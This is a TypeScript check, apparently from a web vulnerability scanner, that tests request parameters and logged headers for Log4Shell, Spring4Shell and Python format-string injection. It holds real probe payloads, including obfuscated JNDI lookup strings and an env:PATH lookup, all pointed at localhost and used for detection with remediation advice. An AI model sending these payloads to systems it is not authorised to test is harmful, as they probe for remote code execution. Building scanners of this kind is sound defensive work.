import { continueWith, defineCheck, done, Severity } from "engine";
import { Tags } from "../../types";
import {
  createRequestWithParameter,
  extractParameters,
  type Parameter,
} from "../../utils";
import { keyStrategy } from "../../utils/key";

/**
 * v2: Fixed Log Injection / Log4Shell
 * - Captures baseline body BEFORE testing — only flags NEW patterns
 * - Separate header-injection step (doesn't overwrite, uses dedicated headers)
 * - Added Spring4Shell class manipulation payloads
 * - Added Python format string injection
 */

type State = {
  params: Parameter[];
  pIndex: number;
  payIndex: number;
  stage: "params" | "headers";
  baselineBody: string;
};

type LogPayload = {
  value: string;
  patterns: RegExp[];
  description: string;
  severity: Severity;
};

const PARAM_PAYLOADS: LogPayload[] = [
  // Log4Shell JNDI
  { value: "${jndi:ldap://127.0.0.1/test}", patterns: [/InitialContext|NamingException|lookup.*failed|ClassNotFoundException.*jndi/i], description: "Log4Shell JNDI/LDAP", severity: Severity.CRITICAL },
  { value: "${jndi:dns://127.0.0.1/test}", patterns: [/NamingException|dns.*lookup|UnknownHostException/i], description: "Log4Shell JNDI/DNS", severity: Severity.CRITICAL },
  // Obfuscated
  { value: "${${lower:j}ndi:ldap://127.0.0.1/t}", patterns: [/NamingException|lookup|jndi/i], description: "Log4Shell obfuscated (lower)", severity: Severity.CRITICAL },
  { value: "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1/t}", patterns: [/NamingException|jndi/i], description: "Log4Shell obfuscated (::)", severity: Severity.CRITICAL },
  // Log4j2 context lookups
  { value: "${env:PATH}", patterns: [/\/usr\/.*bin|\/sbin|\\Windows\\system32/i], description: "Log4j2 env:PATH lookup", severity: Severity.HIGH },
  { value: "${sys:os.name}", patterns: [/^.*(Linux|Windows Server|Mac OS X|FreeBSD).*$/im], description: "Log4j2 sys:os.name", severity: Severity.HIGH },
  { value: "${java:version}", patterns: [/\b\d+\.\d+\.\d+.*(?:Java|OpenJDK|Temurin|Corretto)/i], description: "Log4j2 java:version", severity: Severity.HIGH },
  { value: "${java:os}", patterns: [/Linux|Windows|amd64|x86_64/i], description: "Log4j2 java:os", severity: Severity.HIGH },
  // Spring4Shell class manipulation
  { value: "class.module.classLoader.DefaultAssertionStatus=true", patterns: [/classLoader|SpringBoot|module|DefaultAssertion/i], description: "Spring4Shell class loader", severity: Severity.CRITICAL },
  // Python format string
  { value: "{.__class__.__mro__[1].__subclasses__()}", patterns: [/subprocess|Popen|WarningMessage|catch_warnings/i], description: "Python format string injection", severity: Severity.HIGH },
];

const HEADER_PAYLOADS: LogPayload[] = [
  { value: "${jndi:ldap://127.0.0.1/hdr}", patterns: [/NamingException|InitialContext|jndi/i], description: "Log4Shell via headers", severity: Severity.CRITICAL },
  { value: "${env:PATH}", patterns: [/\/usr\/.*bin|\\Windows\\system32/i], description: "Log4j2 env:PATH via headers", severity: Severity.HIGH },
];

// Headers commonly logged by servers/WAFs
const INJECTABLE_HEADERS = [
  "X-Api-Version", "X-Forwarded-For", "X-Client-IP",
  "True-Client-IP", "X-Custom-IP-Authorization",
  "Accept-Language", "Referer",
];

function getBody(resp: any): string {
  try { return resp?.getBody?.()?.toText?.() ?? ""; } catch { return ""; }
}

export default defineCheck<State>(({ step }) => {
  step("collect", (state, ctx) => {
    const params = extractParameters(ctx);
    const baselineBody = getBody(ctx.target.response);
    return continueWith({
      nextStep: "testParams",
      state: { params, pIndex: 0, payIndex: 0, stage: "params" as const, baselineBody },
    });
  });

  step("testParams", async (state, ctx) => {
    if (state.params.length === 0 || state.pIndex >= state.params.length) {
      return continueWith({ nextStep: "testHeaders", state: { ...state, payIndex: 0, stage: "headers" as const } });
    }
    if (state.payIndex >= PARAM_PAYLOADS.length) {
      return continueWith({ nextStep: "testParams", state: { ...state, pIndex: state.pIndex + 1, payIndex: 0 } });
    }

    const param = state.params[state.pIndex]!;
    const payload = PARAM_PAYLOADS[state.payIndex]!;

    try {
      const spec = createRequestWithParameter(ctx, param, param.value + payload.value);
      const { request, response } = await ctx.sdk.requests.send(spec);
      if (response) {
        const body = getBody(response);
        const hit = payload.patterns.find(p => p.test(body) && !p.test(state.baselineBody));
        if (hit) {
          return done({ state, findings: [{
            name: `Log Injection: ${payload.description}`,
            description:
              `Parameter \`${param.name}\` (${param.source}) triggered a log/template injection.\n\n` +
              `**Payload:** \`${payload.value}\`\n**Evidence:** \`${hit.source}\` (not in baseline)\n\n` +
              `${payload.severity === Severity.CRITICAL ? "**CRITICAL:** This indicates Log4Shell (CVE-2021-44228) or Spring4Shell — Remote Code Execution.\n\n" : ""}` +
              `**Recommendation:** Upgrade Log4j to 2.17+, disable message lookups, use parameterized logging.`,
            severity: payload.severity,
            correlation: { requestID: request.getId(), locations: [] },
          }] });
        }
      }
    } catch {}

    return continueWith({ nextStep: "testParams", state: { ...state, payIndex: state.payIndex + 1 } });
  });

  step("testHeaders", async (state, ctx) => {
    if (state.payIndex >= HEADER_PAYLOADS.length) return done({ state });
    const payload = HEADER_PAYLOADS[state.payIndex]!;

    try {
      const spec = ctx.target.request.toSpec();
      // Inject into SAFE headers (not User-Agent which might break the request)
      for (const hdr of INJECTABLE_HEADERS) {
        spec.setHeader?.(hdr, payload.value);
      }
      const { request, response } = await ctx.sdk.requests.send(spec);
      if (response) {
        const body = getBody(response);
        const hit = payload.patterns.find(p => p.test(body) && !p.test(state.baselineBody));
        if (hit) {
          return done({ state, findings: [{
            name: `Log Injection via HTTP Headers: ${payload.description}`,
            description:
              `JNDI/Log4j injection succeeded via HTTP headers.\n\n` +
              `**Headers injected:** ${INJECTABLE_HEADERS.map(h => `\`${h}\``).join(", ")}\n` +
              `**Payload:** \`${payload.value}\`\n**Evidence:** \`${hit.source}\` (not in baseline)`,
            severity: payload.severity,
            correlation: { requestID: request.getId(), locations: [] },
          }] });
        }
      }
    } catch {}

    return continueWith({ nextStep: "testHeaders", state: { ...state, payIndex: state.payIndex + 1 } });
  });

  return {
    metadata: {
      id: "log-injection",
      name: "Log Injection / Log4Shell / Spring4Shell",
      description: "Tests parameters and headers for Log4Shell JNDI (+ obfuscated), Log4j2 context lookups, Spring4Shell class manipulation, and Python format strings. Baseline comparison eliminates FPs.",
      type: "active",
      tags: [Tags.INJECTION, Tags.RCE],
      severities: [Severity.HIGH, Severity.CRITICAL],
      aggressivity: { minRequests: 1, maxRequests: "Infinity" },
    },
    initState: (): State => ({ params: [], pIndex: 0, payIndex: 0, stage: "params" as const, baselineBody: "" }),
    dedupeKey: keyStrategy().withMethod().withHost().withPort().withPath().build(),
  };
});
